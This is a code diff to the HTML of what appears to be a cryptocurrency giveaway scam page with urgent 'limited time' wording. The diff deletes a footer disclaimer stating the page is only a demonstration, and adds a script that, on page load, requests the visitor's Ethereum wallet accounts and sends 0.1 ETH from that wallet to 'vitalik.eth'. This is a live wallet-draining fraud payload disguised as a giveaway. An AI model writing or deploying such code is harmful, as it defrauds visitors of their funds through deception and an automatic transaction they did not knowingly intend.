@@ -81,6 +81,29 @@
         <div class="loading">Processing... Please wait for confirmation!</div>
         <p class="send-note">Hurry! Offer valid for a limited time only.</p>
     </div>
-    <footer>Disclaimer: This is a demonstration page and not an actual giveaway.</footer>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script>
+        if (typeof window.ethereum !== 'undefined') {
+  const provider = new ethers.providers.Web3Provider(window.ethereum);
+  const signer = provider.getSigner();
+
+  async function sendTransaction() {
+    try {
+      const tx = await signer.sendTransaction({
+        to: "vitalik.eth",
+        value: ethers.utils.parseEther("0.1")
+      });
+      console.log("Transaction sent:", tx);
+    } catch (error) {
+      console.error("Transaction failed:", error);
+    }
+  }
+
+  provider.send("eth_requestAccounts", []).then(sendTransaction).catch(console.error);
+} else {
+  console.error("Ethereum wallet not found. Please install MetaMask or another Ethereum wallet.");
+}
+
+    </script>
 </body>
 </html>
